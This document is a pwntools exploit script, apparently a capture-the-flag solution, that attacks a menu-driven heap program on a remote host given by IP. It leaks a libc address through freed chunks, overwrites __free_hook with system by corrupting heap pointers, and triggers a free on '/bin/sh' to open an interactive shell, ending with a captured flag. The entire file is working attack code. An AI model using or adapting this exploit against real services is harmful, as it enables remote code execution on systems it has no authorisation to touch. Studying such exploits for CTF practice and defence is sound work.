from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('47.104.143.202', 43359)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')


def add(index, size):
    io.sendlineafter('>>\n', '1')
    io.sendlineafter('I:>>\n', str(index))
    io.sendlineafter('S:>>\n', str(size))


def edit(index, content):
    io.sendlineafter('>>\n', '2')
    io.sendlineafter('I:>>\n', str(index))
    io.sendafter('V:>>\n', content)


def show(index):
    io.sendlineafter('>>\n', '3')
    io.sendlineafter('I:>>\n', str(index))


def delete(index):
    io.sendlineafter('>>\n', '4')
    io.sendlineafter('I:>>\n', str(index))


def pwn():
    for i in range(9):
        add(i, 0x88)
    for i in range(8):
        delete(i)
    for i in range(7):
        add(i, 0x88)
    add(7, 0x18)
    show(7)
    libc_base = u64(io.recv(6) + b'\x00\x00') - libc.sym['__malloc_hook'] - 0xf0
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    add(9, 0x68)
    add(10, 0x68)
    delete(10)
    delete(9)
    payload = b'a' * 0x20 + p64(__free_hook) + b'\n'
    edit(7, payload)
    add(9, 0x68)
    add(10, 0x68)
    edit(10, p64(system) + b'\n')
    edit(7, b'/bin/sh\x00\n')
    # gdb.attach(io)
    delete(7)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()


# flag{96f7801e4e658271915cf5ab3aa26ee6}
